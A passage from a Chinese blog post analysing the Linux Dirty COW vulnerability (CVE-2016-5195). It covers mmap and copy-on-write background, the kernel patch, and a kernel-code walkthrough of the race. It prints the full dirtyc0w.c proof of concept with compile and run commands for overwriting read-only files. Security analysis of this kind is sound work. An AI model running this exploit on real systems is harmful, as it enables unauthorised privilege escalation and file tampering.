<p>首先发生了四次ring0和ring3的上下文切换（两次系统调用，每次系统调用都是先从ring3到ring0，ring0得到结果时再将结果返回给ring3）。而上下文切换到成本并不小，一次切换需要耗时几十纳秒到几微秒，虽然时间看上去很短，但是在高并发的场景下，这类时间容易被累积和放大，从而影响系统的性能。</p>
<p>其次，还<strong>发生了 4 次数据拷贝</strong>，其中两次是 DMA 的拷贝，另外两次则是通过 CPU 拷贝的，下面说一下这个过程：</p>
<ul>
<li><em>第一次拷贝</em>，把磁盘上的数据拷贝到操作系统内核的缓冲区（page cache）里，这个拷贝的过程是通过 DMA 搬运的。</li>
<li><em>第二次拷贝</em>，把内核缓冲区（page cache）的数据拷贝到用户的缓冲区里，于是我们应用程序就可以使用这部分数据了，这个拷贝到过程是由 CPU 完成的。</li>
<li><em>第三次拷贝</em>，把刚才拷贝到用户的缓冲区里的数据，再拷贝到内核的 socket 的缓冲区（page cache）里，这个过程依然还是由 CPU 搬运的。</li>
<li><em>第四次拷贝</em>，把内核的 socket 缓冲区（page cache）里的数据，拷贝到网卡的缓冲区里，这个过程又是由 DMA 搬运的。</li>
</ul>
<p>这种简单又传统的文件传输方式，存在冗余的上文切换和数据拷贝，在高并发系统里是非常糟糕的，多了很多不必要的开销，会严重影响系统性能。</p>
<p>所以，<strong>要想提高文件传输的性能，就需要减少「用户态与内核态的上下文切换」和「内存拷贝」的次数</strong>。</p>
<h5 id="（2）mmap-write"><a href="#（2）mmap-write" class="headerlink" title="（2）mmap + write"></a>（2）mmap + write</h5><p>在前面我们知道，<code>read()</code> 系统调用的过程中会把内核缓冲区的数据拷贝到用户的缓冲区里，于是为了减少这一步开销，我们可以用 <code>mmap()</code> 替换 <code>read()</code> 系统调用函数。                                               </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">buf = <span class="built_in">mmap</span>(file, len);</span><br><span class="line"><span class="built_in">write</span>(sockfd, buf, len);</span><br></pre></td></tr></table></figure>

<p><code>mmap()</code> 系统调用函数会直接把内核缓冲区里的数据「<strong>映射</strong>」到用户空间，这样，操作系统内核与用户空间就不需要再进行任何的数据拷贝操作。</p>
<p>![mmap + write 零拷贝](mmap + write 零拷贝.png)</p>
<p>具体过程如下：</p>
<ul>
<li>应用进程调用了 <code>mmap()</code> 后，DMA 会把磁盘的数据拷贝到内核的缓冲区（page cache）里。接着，应用进程跟操作系统内核「共享」这个缓冲区；</li>
<li>应用进程再调用 <code>write()</code>，操作系统直接将内核缓冲区（page cache）的数据拷贝到 socket 缓冲区（page cache）中，这一切都发生在内核态，由 CPU 来搬运数据；</li>
<li>最后，把内核的 socket 缓冲区（page cache）里的数据，拷贝到网卡的缓冲区里，这个过程是由 DMA 搬运的。</li>
</ul>
<p>我们可以得知，通过使用 <code>mmap()</code> 来代替 <code>read()</code>， 可以减少一次数据拷贝的过程。也就是说，使用mmap + write进行文件传输会进行四次上下文切换以及三次数据拷贝。</p>
<h5 id="（3）mmap解析"><a href="#（3）mmap解析" class="headerlink" title="（3）mmap解析"></a>（3）mmap解析</h5><p>mmap实际上就是将硬盘文件映射到内存中，也就是<strong>内存映射</strong>。说的底层一些是将page cache中的页直接映射到用户进程地址空间中，从而进程可以直接访问自身地址空间的虚拟地址来访问page cache中的页，这样会并涉及page cache到用户缓冲区之间的拷贝，mmap系统调用与read/write调用的区别在于：</p>
<ul>
<li>mmap只需要一次系统调用，后续操作不需要系统调用</li>
<li>访问的数据不需要在page cache和用户缓冲区之间拷贝</li>
</ul>
<p>所以，当频繁对一个文件进行读取操作时，mmap会比read高效一些。</p>
<h4 id="3、内存映射方式与写时复制（COW）"><a href="#3、内存映射方式与写时复制（COW）" class="headerlink" title="3、内存映射方式与写时复制（COW）"></a>3、内存映射方式与写时复制（COW）</h4><h5 id="（1）内存映射"><a href="#（1）内存映射" class="headerlink" title="（1）内存映射"></a>（1）内存映射</h5><p>内存映射即mmap，mmap有两种映射。</p>
<ul>
<li>文件映射：将一个文件的一部分直接映射到调用进程的虚拟内存中</li>
<li>匿名映射：一个映射没有对应的文件（也可以理解成一个内容总是被初始化为零的虚拟文件的映射）</li>
</ul>
<h5 id="（2）写时复制"><a href="#（2）写时复制" class="headerlink" title="（2）写时复制"></a>（2）写时复制</h5><p>当多个进程共享相同的内存时，每个进程都可以对其做修改和读取，此时就会出现一致性问题，由此，映射的方法又可以分为共享和私有：</p>
<ul>
<li><p>私有映射：在映射内容上发生的变更对其他进程不可见，对于文件映射来说即为不会在物理页面（底层）更改。此时就会利用写时复制技术（COW）来实现，<strong>这的写时复制和fork那个写时复制的情景不一样</strong>。</p>
</li>
<li><p>共享映射：在映射内容上发生的变更会对所有共享同一个映射的其他进程可见</p>
</li>
</ul>
<h6 id="fork场景下的写时复制"><a href="#fork场景下的写时复制" class="headerlink" title="fork场景下的写时复制"></a>fork场景下的写时复制</h6><p> 传统的fork()系统调用直接把所有的资源复制给新创建的进程。这种实现过于简单并且效率低下，因为它拷贝的数据也许并不共享，更糟的情况是，如果新进程打算立即执行一个新的映像，那么所有的拷贝都将前功尽弃。</p>
<p>Linux的fork()使用写时拷贝（copy-on-write）页实现。写时拷贝是一种可以推迟甚至免除拷贝数据的技术。内核此时并不复制整个进程地址空间，而是让父进程和子进程共享同一个拷贝。只有在需要写入的时候，数据才会被复制，从而使各个进程拥有各自的拷贝。也就是说，资源的复制只有在需要写入的时候才进行，在此之前，只是以只读方式共享。这种技术使地址空间上的页的拷贝被推迟到实际发生写入的时候。</p>
<p>在页根本不会被写入的情况下—举例来说，fork()后立即调用exec()—它们就无需复制了。fork()的实际开销就是复制父进程的页表以及给子进程创建惟一的进程描述符。在一般情况下，进程创建后都会马上运行一个可执行的文件，这种优化可以避免拷贝大量根本就不会被使用的数据（地址空间里常常包含数十兆的数据）。由于Unix强调进程快速执行的能力，所以这个优化是很重要的。这里补充一点：<strong>Linux COW与exec没有必然联系</strong></p>
<p><img src="/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2012072020252592.jpg" alt="img"></p>
<h6 id="私有映射写时复制"><a href="#私有映射写时复制" class="headerlink" title="私有映射写时复制"></a>私有映射写时复制</h6><p>这里更加关注于内存数据的共享问题。研究的课题是多个进程共享一块内存，这就不局限于fork的父进程和子进程了，这里的概念会更宽泛一点，可以理解为这个是广义的写时复制。当多个进程共享一块内存时，对该内存的读取当然可以共享，但是一旦对该内存进行写操作时，就一定要区分该内存在进程中的映射是私有映射还是共享映射。当为私有映射时，有写入内存需求的进程会将内容拷贝一份拿到自己的进程空间中，从而对其进行修改。如果为共享映射，则直接修改该共享内存，使得所有映射该内存的进程享受该内存的修改。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="一、补丁分析"><a href="#一、补丁分析" class="headerlink" title="一、补丁分析"></a>一、补丁分析</h3><p><a class="link"   target="_blank" rel="noopener" href="https://bugzilla.suse.com/attachment.cgi?id=697810&action=diff" >补丁链接<i class="fas fa-external-link-alt"></i></a></p>
<p><img src="/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220422164944547.png" alt="image-20220422164944547"></p>
<p>这个 patch 主要是重新定义了一个 flag 为 FOLL_COW 来标记该页是一个 COW 页面。在 faultin_page()函数中当 do_wp_page 对某个 COW 页面处理之后返回 VM_FAULT_WRITE 并且该页对应的 vma 属性是不可写的情况，不再是拿掉 FOLL_WRITE 而且设置新的标记 FOLL_COW，表示我这个是 COW 页，因此可以避免上述的竞争关系。此外使用 pte 的 dirty 位来验证 FOLL_COW 的有效性。</p>
<h3 id="二、exp分析（未完成）"><a href="#二、exp分析（未完成）" class="headerlink" title="二、exp分析（未完成）"></a>二、exp分析（未完成）</h3><p>源码如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *map;</span><br><span class="line"><span class="keyword">int</span> f;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"><span class="keyword">char</span> *name;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">madviseThread</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *str;</span><br><span class="line">  str=(<span class="keyword">char</span>*)arg;</span><br><span class="line">  <span class="keyword">int</span> i,c=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">100000000</span>;i++) &#123;</span><br><span class="line">    c+=<span class="built_in">madvise</span>(map,<span class="number">100</span>,MADV_DONTNEED);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;madvise %d\n\n&quot;</span>,c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">procselfmemThread</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *str;</span><br><span class="line">  str=(<span class="keyword">char</span>*)arg;</span><br><span class="line">  <span class="keyword">int</span> f=<span class="built_in">open</span>(<span class="string">&quot;/proc/self/mem&quot;</span>,O_RDWR);</span><br><span class="line">  <span class="keyword">int</span> i,c=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">100000000</span>;i++) &#123;</span><br><span class="line">    <span class="built_in">lseek</span>(f,map,SEEK_SET);</span><br><span class="line">    c+=<span class="built_in">write</span>(f,str,<span class="built_in">strlen</span>(str));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;procselfmem %d\n\n&quot;</span>, c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (argc&lt;<span class="number">3</span>)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">pthread_t</span> pth1,pth2;</span><br><span class="line">  f=<span class="built_in">open</span>(argv[<span class="number">1</span>],O_RDONLY);</span><br><span class="line">  <span class="built_in">fstat</span>(f,&amp;st);</span><br><span class="line">  name=argv[<span class="number">1</span>];</span><br><span class="line">  map=<span class="built_in">mmap</span>(<span class="literal">NULL</span>,st.st_size,PROT_READ,MAP_PRIVATE,f,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;mmap %x\n\n&quot;</span>,map);</span><br><span class="line">  <span class="built_in">pthread_create</span>(&amp;pth1,<span class="literal">NULL</span>,madviseThread,argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">pthread_create</span>(&amp;pth2,<span class="literal">NULL</span>,procselfmemThread,argv[<span class="number">2</span>]);</span><br><span class="line">  <span class="built_in">pthread_join</span>(pth1,<span class="literal">NULL</span>);</span><br><span class="line">  <span class="built_in">pthread_join</span>(pth2,<span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译运行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread dirtyc0w.c -o dirtyc0w</span><br><span class="line">./dirtyc0w file string					<span class="comment"># 这里可以将任意文件修改为任意字符</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220426093131936.png" alt="image-20220426093131936"></p>
<p>通过资料查询获得相关函数功能。</p>
<ul>
<li>open: 打开一个文件系统中的文件，返回文件描述符</li>
<li>write: 向打开的文件描述符中，写相应的内容</li>
<li>fstat: 获得文件描述符指向的文件的更多信息，如文件大小等</li>
<li>mmap: 通过文件描述符，将已经打开的文件映射到内存中。当flags的MAP_PRIVATE被置为1时，对mmap得到内存映射进行的写操作会使内核触发COW操作，写的是COW后的内存，不会同步到磁盘的文件中。</li>
<li>lseek: 按照偏移更改文件描述符的指针。 原型： off_t lseek(int fd, off_t offset, int whence)；</li>
<li>madvise:告诉内核内存addr～addr+len在接下来的使用状况，以便内核进行一些进一步的内存管理操作。当advice为MADV_DONTNEED时，此系统调用相当于通知内核addr～addr+len的内存在接下来不再使用，内核将释放掉这一块内存以节省空间，相应的页表项也会被置空。</li>
</ul>
<p>exp代码总结下来就是启动两个线程</p>
<ol>
<li>write不断向传入的文件映射的虚拟内存写字符串</li>
<li>madvise不断将文件映射的虚拟内存置为MADV_DONTNEED，也就是抛弃掉。</li>
</ol>
<p>整个漏洞利用流程大概是</p>
<ol>
<li>write map。由于首次访问，mmap未申请page cache与磁盘文件做映射，从而页表建立也无从谈起，导致page fault（缺页）。</li>
<li>write map，page fault（语义冲突），发现需要写权限，由于设置了MAP_PRIVATE，触发COW，创建内存副本并<strong>将FOLL_WRITE置为0</strong>。</li>
<li>madivse抛弃掉map，实际上抛弃掉的是COW出的副本。注意此时FOLL_WRITE仍为0.</li>
<li>write map，不需要写权限，直接写入只读文件。</li>
</ol>
<p>整个流程包含了三次<code>write</code>以及中间的一次<code>madivse</code>，关键点在于FOLL_WRITE置为0并通过一系列构造完成漏洞利用。</p>
<p>接下来我们详细的漏洞分析。</p>
<h3 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h3><p>该篇章的一些描述参考自<a class="link"   target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/assets/attachment/%E5%A5%94%E8%B7%91%E5%90%A7-linux%E5%86%85%E6%A0%B8-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-DirtyCow.pdf" >该文章<i class="fas fa-external-link-alt"></i></a>，作者讲得比较详细，推荐大家也可以支持一下。</p>
<p>Dirtycow 程序首先以只读的方式打开一个文件，然后使用 mmap 映射这个文件的内容到用户空间，这里使用 MAP_PRIVATE 映射属性。因此它是一个进程私有的映射，这样 mmap 创建的 VMA 属性就是私有并且只读的，它只设置了 VM_READ，并没有设置 VM_SHARED。VMA 的 flags 标志位中只有 VM_SHARED 标志位，没有 PRIVATE 相关的标志位，因此没设置 VM_SHARED 的就表示这个 VMA 是私有的。利用 mmap 进行的文件映射页面在内核空间是 page cache。主程序创 建了两个线程“madviseThread”和“procselfmemThread”。</p>
<h4 id="（0）函数调用栈"><a href="#（0）函数调用栈" class="headerlink" title="（0）函数调用栈"></a>（0）函数调用栈</h4><p>这里先贴一下函数调用栈，方便大家对下面的函数调用关系有比较清晰的认识</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mem_write</span><br><span class="line">	mem_rw</span><br><span class="line">		access_remote_vm</span><br><span class="line">			__access_remote_vm</span><br><span class="line">    			get_user_pages</span><br><span class="line">     				__get_user_pages_locked</span><br><span class="line">      					__get_user_pages</span><br><span class="line">       						follow_page_mask</span><br><span class="line">        						follow_page_pte</span><br><span class="line">       						faultin_page</span><br><span class="line">						        handle_mm_fault</span><br><span class="line">						         	__handle_mm_fault</span><br><span class="line">						          		handle_pte_fault</span><br><span class="line">						           			do_fault</span><br><span class="line">						           				do_cow_fault</span><br><span class="line">						             				do_set_pte</span><br><span class="line">						              					maybe_mkwrite</span><br></pre></td></tr></table></figure>



<h4 id="（1）第一次write"><a href="#（1）第一次write" class="headerlink" title="（1）第一次write"></a>（1）第一次write</h4><p>第一次write，因为用户空间那段内存（dirtycow 程序中 map 指针指向的内存）其实还没有和实际物理页面建立映射关系。（由于page cache没有建立，所以map与page chache，page cache与磁盘内容均未建立联系。所以map对应的页表项也不存在）。所以会触发缺页中断建立page cache，由于没有写权限且私有映射，所以将执行COW操作，在进程中建立对应的page cache</p>
<h5 id="proc-mem-operations"><a href="#proc-mem-operations" class="headerlink" title="proc_mem_operations"></a>proc_mem_operations</h5><p>这里的<code>write</code>表示对<code>/proc/self/mem</code>写入，而<code>write</code>这个系统调用，在操作不同的对象时，方法也是不同的。而对<code>/proc/self/mem</code>的操作定义在<code>fs/proc/base.c</code>中，如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">proc_mem_operations</span> =</span> &#123;</span><br><span class="line">        .llseek         = mem_lseek,</span><br><span class="line">        .read           = mem_read,</span><br><span class="line">        .write          = mem_write,</span><br><span class="line">        .open           = mem_open,</span><br><span class="line">        .release        = mem_release,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h5 id="access-remote-vm"><a href="#access-remote-vm" class="headerlink" title="__access_remote_vm"></a>__access_remote_vm</h5><p><code>mem_write</code>经过一系列系统调用达到<code>access_remote_vm</code>来实现访问用户进程的地址空间。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 函数调用： mem_write() -&gt; mem_rw() -&gt; access_remote_vm() -&gt; __access_remote_vm()</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __access_remote_vm(struct task_struct *tsk, struct mm_struct *mm,</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">void</span> *buf, <span class="keyword">int</span> len, <span class="keyword">int</span> write)</span><br><span class="line">&#123;</span><br><span class="line">                ret = get_user_pages(tsk, mm, addr, <span class="number">1</span>,								<span class="comment">// 调用get_user_pages 获取对应的物理页面</span></span><br><span class="line">                                write, <span class="number">1</span>, &amp;page, &amp;vma);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="get-user-pages"><a href="#get-user-pages" class="headerlink" title="__get_user_pages"></a>__get_user_pages</h5><p>在知道进程的mm数据结构、虚拟地址addr后就可以获取对应的物理页面了，内核提供 了这样一个 API 函数：get_user_pages()。这里传递给 get_user_pages 的参数是 write=1 和 force=1 以及 page 指针，在后续的函数调用中会转换成 FOLL_WRITE | FOLL_FORCE | FOLL_GET 标 志位。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"># 函数调用： __access_remote_vm() -&gt; get_user_pages() -&gt; __get_user_pages_locked()</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">long</span> __get_user_pages_locked(...)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (pages)</span><br><span class="line">            flags |= FOLL_GET;</span><br><span class="line">    <span class="keyword">if</span> (write)</span><br><span class="line">        flags |= FOLL_WRITE;</span><br><span class="line">    <span class="keyword">if</span> (force)</span><br><span class="line">        flags |= FOLL_FORCE;</span><br><span class="line">    ...</span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">                ret = __get_user_pages(tsk, mm, start, nr_pages, flags, pages,</span><br><span class="line">                                       vmas, locked);	</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"># 函数调用：  __get_user_pages_locked() -&gt; __get_user_pages()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">long</span> __get_user_pages(struct task_struct *tsk, struct mm_struct *mm,</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">long</span> start, <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_pages,</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">int</span> gup_flags, struct page **pages,</span><br><span class="line">                struct vm_area_struct **vmas, <span class="keyword">int</span> *nonblocking)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">retry:</span><br><span class="line">               ...</span><br><span class="line">                cond_resched();</span><br><span class="line">                page = follow_page_mask(vma, start, foll_flags, &amp;page_mask);				<span class="comment">// 获取页表项，这里的start与vma-&gt;vm_start是我们exp中的map指针。</span></span><br><span class="line">                <span class="keyword">if</span> (!page) &#123;</span><br><span class="line">                        <span class="keyword">int</span> ret;</span><br><span class="line">                        ret = faultin_page(tsk, vma, start, &amp;foll_flags,									<span class="comment">// 当获取页表项失败触发错误处理。</span></span><br><span class="line">                                        nonblocking);</span><br><span class="line">                        <span class="keyword">switch</span> (ret) &#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                                <span class="keyword">goto</span> retry;																						<span class="comment">// 如果错误码为0，说明没什么问题，继续重试获取页表项。</span></span><br><span class="line">                       ...</span><br><span class="line">    			...</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__get_user_pages);</span><br></pre></td></tr></table></figure>

<p>而 FOLL_WRITE | FOLL_FORCE | FOLL_GET 等定义在<code>include/linux/mm.h</code>，如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FOLL_WRITE      0x01    <span class="comment">/* check pte is writable */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FOLL_TOUCH      0x02    <span class="comment">/* mark page accessed */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FOLL_GET        0x04    <span class="comment">/* do get_page on page */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FOLL_DUMP       0x08    <span class="comment">/* give error on hole if it would be zero */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FOLL_FORCE      0x10    <span class="comment">/* get_user_pages read/write w/o permission */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FOLL_NOWAIT     0x20    <span class="comment">/* if a disk transfer is needed, start the IO</span></span></span><br><span class="line"><span class="comment"><span class="meta">                                 * and return without waiting upon it */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FOLL_POPULATE   0x40    <span class="comment">/* fault in page */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FOLL_SPLIT      0x80    <span class="comment">/* don&#x27;t return transhuge pages, split them */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FOLL_HWPOISON   0x100   <span class="comment">/* check page is hwpoisoned */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FOLL_NUMA       0x200   <span class="comment">/* force NUMA hinting page fault */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FOLL_MIGRATION  0x400   <span class="comment">/* wait for page to replace migration entry */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FOLL_TRIED      0x800   <span class="comment">/* a retry, previous pass started an IO */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FOLL_MLOCK      0x1000  <span class="comment">/* lock present pages */</span></span></span><br></pre></td></tr></table></figure>

<p>调试中得到对应的gup_flags为0x17，则对应了上面的 FOLL_WRITE | FOLL_FORCE | FOLL_GET | FOLL_TOUCH</p>
<p>FOLL_WRITE ：检查pte是否可写。如果为0，则页面不可被写入.</p>
<p>FOLL_FORCE： 忽略权限对强制对用户页进行读写。</p>
<h5 id="follow-page-pte"><a href="#follow-page-pte" class="headerlink" title="follow_page_pte"></a>follow_page_pte</h5><p>由于第一次写的时候因为用户空间那段内存（dirtycow 程序中 map 指针指向的内存）其实还没有和实际物理页面建立映射关系，所以 follow_page_mask()函数是不可能返回正确的 page 数据结构的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># 函数调用：__get_user_pages() -&gt; follow_page_mask -&gt; follow_page_pte()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct page *<span class="title">follow_page_pte</span><span class="params">(struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pmd_t</span> *pmd, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">        <span class="keyword">if</span> (!pte_present(pte)) &#123;						</span><br><span class="line">              ...</span><br><span class="line">                <span class="keyword">if</span> (pte_none(pte))									<span class="comment">// 第一次write时由于虚拟内存并未与page建立联系，所以这里的pte为0.</span></span><br><span class="line">                        <span class="keyword">goto</span> no_page;</span><br><span class="line">				...</span><br><span class="line">        <span class="keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) &#123;</span><br><span class="line">                pte_unmap_unlock(ptep, ptl);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">       ...</span><br><span class="line">out:</span><br><span class="line">        pte_unmap_unlock(ptep, ptl);</span><br><span class="line">        <span class="keyword">return</span> page;</span><br><span class="line">no_page:</span><br><span class="line">        pte_unmap_unlock(ptep, ptl);</span><br><span class="line">        <span class="keyword">if</span> (!pte_none(pte))</span><br><span class="line">                <span class="keyword">return</span> <span 